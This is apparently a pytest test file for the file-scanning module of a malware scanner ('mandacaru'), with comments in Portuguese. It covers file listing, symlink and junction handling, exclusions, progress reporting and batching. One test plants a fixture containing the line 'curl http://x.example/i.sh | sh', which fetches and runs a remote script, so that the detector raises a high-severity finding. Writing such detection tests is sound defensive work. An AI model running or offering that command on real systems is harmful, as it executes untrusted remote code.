import sys
from pathlib import Path

import pytest
from mandacaru_win.scan import (
    is_cloud_only,
    list_files,
    scan_paths,
    sha256_file,
)

from mandacaru.events import Severity


def run(paths, scanner, trusted=frozenset(), stop_after=None):
    findings, calls = [], []

    def on_progress(path, done, total):
        calls.append((path, done, total))

    def should_stop():
        return stop_after is not None and len(calls) >= stop_after

    summary = scan_paths(paths, scanner, trusted, on_progress,
                         findings.append, should_stop)
    return summary, findings, calls


def test_finding_grouped_per_file(tmp_path, scanner, ps_text):
    (tmp_path / "a.ps1").write_text(ps_text + "curl http://x.example/i.sh | sh\n")
    (tmp_path / "ok.txt").write_text("nada aqui")
    summary, findings, _ = run([tmp_path], scanner)
    assert [f.path.name for f in findings] == ["a.ps1"]
    assert len(findings[0].alerts) >= 2 and findings[0].severity == Severity.HIGH
    assert findings[0].sha256 == sha256_file(tmp_path / "a.ps1")
    assert summary.files == 2 and summary.findings == 1 and summary.completed


def test_trusted_hash_is_skipped(tmp_path, scanner, ps_text):
    f = tmp_path / "a.ps1"
    f.write_text(ps_text)
    _, findings, _ = run([tmp_path], scanner, trusted={sha256_file(f)})
    assert findings == []


def test_stop_interrupts(tmp_path, scanner):
    for i in range(5):
        (tmp_path / f"{i}.txt").write_text("x")
    summary, _, _ = run([tmp_path], scanner, stop_after=2)
    assert not summary.completed and summary.files == 2


def test_progress_reports_total(tmp_path, scanner):
    for i in range(3):
        (tmp_path / f"{i}.txt").write_text("x")
    _, _, calls = run([tmp_path], scanner)
    assert [(d, t) for _, d, t in calls] == [(1, 3), (2, 3), (3, 3)]


def test_skips_dev_dirs_and_dir_symlinks(tmp_path, scanner, ps_text):
    (tmp_path / ".git").mkdir()
    (tmp_path / ".git" / "a.ps1").write_text(ps_text)
    outside = tmp_path.parent / (tmp_path.name + "_fora")
    outside.mkdir()
    (outside / "b.ps1").write_text(ps_text)
    try:
        (tmp_path / "link").symlink_to(outside, target_is_directory=True)
    except OSError:
        pytest.skip("sem permissão para criar symlink")
    assert list_files([tmp_path], scanner) == []


def test_single_file_missing_path_and_overlap(tmp_path, scanner, ps_text):
    sub = tmp_path / "sub"
    sub.mkdir()
    f = sub / "a.ps1"
    f.write_text(ps_text)
    files = list_files([sub, tmp_path, f, tmp_path / "nao-existe"], scanner)
    assert files == [f]


def test_cloud_only_attributes():
    class St:
        st_file_attributes = 0x00400000  # FILE_ATTRIBUTE_RECALL_ON_DATA_ACCESS

    assert is_cloud_only(St())
    St.st_file_attributes = 0x20  # ARCHIVE
    assert not is_cloud_only(St())


@pytest.mark.skipif(sys.platform != "win32", reason="junção só existe no Windows")
def test_directory_junction_is_not_followed(tmp_path, scanner, ps_text):
    import _winapi

    outside = tmp_path.parent / (tmp_path.name + "_fora")
    outside.mkdir()
    (outside / "b.ps1").write_text(ps_text)
    _winapi.CreateJunction(str(outside), str(tmp_path / "juncao"))
    assert list_files([tmp_path], scanner) == []


def test_stop_during_listing_is_fast_and_incomplete(tmp_path, scanner):
    for i in range(20):
        d = tmp_path / f"d{i}"
        d.mkdir()
        (d / "a.txt").write_text("x")
    visited = []
    summary = scan_paths([tmp_path], scanner, frozenset(), lambda *_: None, lambda f: None,
                         lambda: bool(visited) , on_listing=visited.append)
    assert not summary.completed and summary.files == 0 and len(visited) == 1


def test_list_files_reports_listing_progress(tmp_path, scanner):
    (tmp_path / "s").mkdir()
    (tmp_path / "a.txt").write_text("x")
    (tmp_path / "s" / "b.txt").write_text("x")
    counts = []
    assert len(list_files([tmp_path], scanner, on_listing=counts.append)) == 2
    assert counts[-1] == 2


def test_scan_file_exception_does_not_abort(tmp_path, scanner, ps_text, monkeypatch):
    (tmp_path / "a.ps1").write_text(ps_text)
    (tmp_path / "b.ps1").write_text(ps_text)
    real = scanner.scan_file
    calls = []

    def boom(path):
        calls.append(path)
        if len(calls) == 1:
            raise RuntimeError("falha")
        return real(path)

    monkeypatch.setattr(scanner, "scan_file", boom)
    summary, findings, _ = run([tmp_path], scanner)
    assert summary.completed and summary.files == 2 and len(findings) == 1


def test_own_rules_are_not_flagged(tmp_path, scanner):
    # o base.yar contém os textos que as regras procuram; varrer a pasta do app não pode gerar alarme falso
    import mandacaru

    pkg = Path(mandacaru.__file__).parent
    assert list_files([pkg], scanner) == []
    assert list_files([pkg / "rules" / "yara" / "base.yar"], scanner) == []
    (tmp_path / "x.txt").write_text("ok")
    assert list_files([tmp_path], scanner) == [tmp_path / "x.txt"]


def test_excluded_folders_are_skipped_in_list_and_scan(tmp_path, scanner, ps_text):
    ignorar = tmp_path / "ignorar"
    (ignorar / "sub").mkdir(parents=True)
    (ignorar / "sub" / "a.ps1").write_text(ps_text)
    manter = tmp_path / "manter"
    manter.mkdir()
    (manter / "b.ps1").write_text(ps_text)

    files = list_files([tmp_path], scanner, exclude=[ignorar])
    assert files == [manter / "b.ps1"]
    assert list_files([ignorar / "sub" / "a.ps1"], scanner, exclude=[ignorar]) == []

    findings = []
    summary = scan_paths([tmp_path], scanner, frozenset(), lambda *_: None,
                         findings.append, lambda: False, exclude=[ignorar])
    assert summary.completed and summary.files == 1 and [f.path for f in findings] == [manter / "b.ps1"]


def test_scan_paths_batches_pause_between_chunks(tmp_path, scanner, monkeypatch):
    for i in range(5):
        (tmp_path / f"{i}.txt").write_text("ok")
    sleeps = []
    monkeypatch.setattr("mandacaru_win.scan.time.sleep", sleeps.append)
    summary = scan_paths([tmp_path], scanner, frozenset(), lambda *_: None,
                         lambda _: None, lambda: False, batch_size=2, batch_pause_s=0.05)
    assert summary.completed and summary.files == 5
    # 5 arquivos com lote de 2 -> pausa após o 2º e após o 4º
    assert sleeps == [0.05, 0.05]
